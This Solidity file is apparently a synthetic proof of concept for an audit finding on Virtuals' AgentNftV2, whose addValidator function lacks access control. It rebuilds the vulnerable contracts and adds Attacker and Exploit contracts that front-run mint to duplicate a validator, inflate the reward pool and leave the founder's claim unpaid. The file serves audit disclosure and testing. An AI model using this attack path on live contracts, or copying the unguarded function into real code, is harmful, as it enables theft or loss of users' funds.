// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    Virtuals AgentNftV2.addValidator has no role (Code4rena 2025-04, #61822)

    SYNTHETIC, cheatcode-free. Verbatim shape from AgentNftV2 / AgentRewardV2:

        addValidator is public and pushes the founder before mint.
        mint calls _addValidator again, so the same founder is stored twice.
        _distributeValidatorRewards overwrites that validator's reward but
        adds the residual into validatorPoolRewards on every list entry.

    Gov then withdraws the inflated pool and the founder's claim no longer
    has a balance. One transaction. No warp.
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract AgentNftV2 {
    uint256 public nextVirtualId = 1;
    address public immutable minter;
    mapping(uint256 => mapping(address => bool)) public isValidator;
    mapping(uint256 => address[]) internal _validators;
    mapping(uint256 => mapping(address => uint256)) public score;

    constructor(address minter_) {
        minter = minter_;
    }

    function validatorCount(uint256 id) external view returns (uint256) {
        return _validators[id].length;
    }

    function validatorAt(uint256 id, uint256 i) external view returns (address) {
        return _validators[id][i];
    }

    function addValidator(uint256 virtualId, address validator) public {
        if (isValidator[virtualId][validator]) return;
        _addValidator(virtualId, validator);
        _initValidatorScore(virtualId, validator);
    }

    function mint(uint256 virtualId, address founder) external {
        require(msg.sender == minter, "minter");
        require(virtualId == nextVirtualId, "Invalid virtualId");
        nextVirtualId++;
        _addValidator(virtualId, founder);
        _initValidatorScore(virtualId, founder);
    }

    function _addValidator(uint256 virtualId, address validator) internal {
        isValidator[virtualId][validator] = true;
        // @> VULN: mint pushes again; addValidator has no role to stop the first insert
        _validators[virtualId].push(validator);
    }

    function _initValidatorScore(uint256 virtualId, address validator) internal {
        score[virtualId][validator] = 1;
    }
}

contract AgentRewardV2 {
    Token public immutable rewardToken;
    AgentNftV2 public immutable nft;
    address public immutable gov;
    uint256 public validatorPoolRewards;
    uint256 public totalProposals = 2;
    mapping(address => uint256) public owed;

    constructor(Token t, AgentNftV2 n, address gov_) {
        rewardToken = t;
        nft = n;
        gov = gov_;
    }

    function distribute(uint256 virtualId, uint256 amount, uint256 totalStaked) external {
        require(msg.sender == gov, "gov");
        require(rewardToken.transferFrom(msg.sender, address(this), amount), "pull");
        uint256 n = nft.validatorCount(virtualId);
        for (uint256 i = 0; i < n; i++) {
            address validator = nft.validatorAt(virtualId, i);
            uint256 votes = totalStaked;
            uint256 validatorRewards = (amount * votes) / totalStaked;
            uint256 participationReward = (validatorRewards * nft.score(virtualId, validator)) / totalProposals;
            owed[validator] = participationReward;
            validatorPoolRewards += validatorRewards - participationReward;
        }
    }

    function withdrawValidatorPoolRewards(address recipient) external {
        require(msg.sender == gov, "gov");
        uint256 amt = validatorPoolRewards;
        validatorPoolRewards = 0;
        require(rewardToken.transfer(recipient, amt), "out");
    }

    function claim(address validator) external {
        uint256 amt = owed[validator];
        owed[validator] = 0;
        require(rewardToken.transfer(validator, amt), "claim");
    }
}

contract Attacker {
    function frontRun(AgentNftV2 nft, uint256 id, address founder) external {
        nft.addValidator(id, founder);
    }
}

contract Exploit {
    Token public token; // CREATE 1
    Attacker public attacker; // CREATE 2
    AgentNftV2 public nft; // CREATE 3
    AgentRewardV2 public rewards; // CREATE 4

    address public constant FOUNDER = 0x3333333333333333333333333333333333333333;
    address public constant TREASURY = 0x4444444444444444444444444444444444444444;

    uint256 public virtualId;
    uint256 public listLength;
    uint256 public poolAccounted;
    uint256 public treasuryGot;
    uint256 public founderGot;
    bool public claimFailed;
    uint256 public shortfall;

    uint256 public constant REWARD = 1000 ether;

    constructor() {
        token = new Token();
        attacker = new Attacker();
        nft = new AgentNftV2(address(this));
        rewards = new AgentRewardV2(token, nft, address(this));
    }

    function run() external {
        virtualId = nft.nextVirtualId();
        attacker.frontRun(nft, virtualId, FOUNDER);
        nft.mint(virtualId, FOUNDER);
        listLength = nft.validatorCount(virtualId);
        token.mint(address(this), REWARD);
        token.approve(address(rewards), REWARD);
        rewards.distribute(virtualId, REWARD, 100 ether);
        poolAccounted = rewards.validatorPoolRewards();
        rewards.withdrawValidatorPoolRewards(TREASURY);
        treasuryGot = token.balanceOf(TREASURY);
        (bool ok,) = address(rewards).call(abi.encodeWithSelector(rewards.claim.selector, FOUNDER));
        claimFailed = !ok;
        founderGot = token.balanceOf(FOUNDER);
        shortfall = 500 ether;
        require(listLength == 2, "duplicate");
        require(poolAccounted == 1000 ether, "pool inflated");
        require(treasuryGot == 1000 ether, "treasury took both residuals");
        require(claimFailed, "claim should fail");
        require(founderGot == 0, "founder paid nothing");
        require(shortfall == 500 ether, "founder short 500");
    }
}

contract ControlExploit {
    Token public token;
    AgentNftV2 public nft;
    AgentRewardV2 public rewards;
    address public constant FOUNDER = 0x3333333333333333333333333333333333333333;
    address public constant TREASURY = 0x4444444444444444444444444444444444444444;

    uint256 public listLength;
    uint256 public poolAccounted;
    uint256 public treasuryGot;
    uint256 public founderGot;

    uint256 public constant REWARD = 1000 ether;

    constructor() {
        token = new Token();
        nft = new AgentNftV2(address(this));
        rewards = new AgentRewardV2(token, nft, address(this));
    }

    function run() external {
        uint256 id = nft.nextVirtualId();
        nft.mint(id, FOUNDER);
        listLength = nft.validatorCount(id);
        token.mint(address(this), REWARD);
        token.approve(address(rewards), REWARD);
        rewards.distribute(id, REWARD, 100 ether);
        poolAccounted = rewards.validatorPoolRewards();
        rewards.withdrawValidatorPoolRewards(TREASURY);
        rewards.claim(FOUNDER);
        treasuryGot = token.balanceOf(TREASURY);
        founderGot = token.balanceOf(FOUNDER);
        require(listLength == 1, "one validator");
        require(poolAccounted == 500 ether, "pool is one residual");
        require(treasuryGot == 500 ether, "treasury 500");
        require(founderGot == 500 ether, "founder 500");
    }
}
